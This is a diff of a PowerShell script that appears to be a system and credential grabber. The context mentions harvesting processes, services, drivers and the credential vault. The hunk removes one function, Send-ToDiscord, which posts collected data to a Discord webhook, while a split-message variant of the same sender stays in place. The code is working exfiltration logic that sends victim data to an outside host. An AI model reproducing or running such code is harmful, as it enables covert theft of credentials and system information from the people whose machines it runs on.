@@ -396,31 +396,6 @@ process,listener,listenerItem,process,service,software,drivers,videocard,
 vault -ErrorAction SilentlyContinue -Force
 
 ############################################################################################################################################################
-function Send-ToDiscord {
-    param ($Message)
-
-    # Escape special characters in the message for JSON compatibility
-    $escapedMessage = $Message -replace '\\', '\\\\' -replace '"', '\"' -replace '\n', '\\n'
-
-    # Create a raw JSON payload directly
-    $payload = '{"content": "```' + $escapedMessage + '```"}'
-
-    # Debug: Output the payload to the console
-    Write-Host "Payload:" $payload
-
-    # Save the payload to a local file for inspection
-    $payload | Out-File -FilePath "C:\temp\payload_debug.txt"
-
-    try {
-        # Use Invoke-WebRequest as an alternative
-        $response = Invoke-WebRequest -Uri $DiscordWebhookUrl -Method "Post" -ContentType "application/json" -Body $payload
-        Write-Host "Data sent to Discord successfully."
-        Write-Host "Response:" $response.StatusCode
-    } catch {
-        Write-Error "Failed to send data to Discord."
-        Write-Error $_.Exception.Message
-    }
-}
 
 function Send-SplitToDiscord {
     param ($Message)
